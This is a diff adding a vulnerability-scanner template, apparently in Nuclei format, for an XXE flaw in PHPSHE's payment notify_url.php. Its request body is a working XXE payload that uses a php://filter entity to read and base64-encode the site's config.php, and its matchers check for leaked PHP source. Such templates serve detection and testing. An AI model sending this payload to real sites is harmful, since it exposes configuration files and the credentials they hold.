@@ -1,0 +1,25 @@
+id: poc-yaml-phpshe-notify-urlphp-xxe
+info:
+  name: PHPSHE notify_url.php XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe
+
+http:
+  - method: POST
+    path:
+      - "/include/plugin/payway/wechat/notify_url.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      <!DOCTYPE updateProfile [ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../../../../config.php">%file;]>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PD9waHA"
+      - type: word
+        part: body
+        words:
+          - "simplexml_load_string"
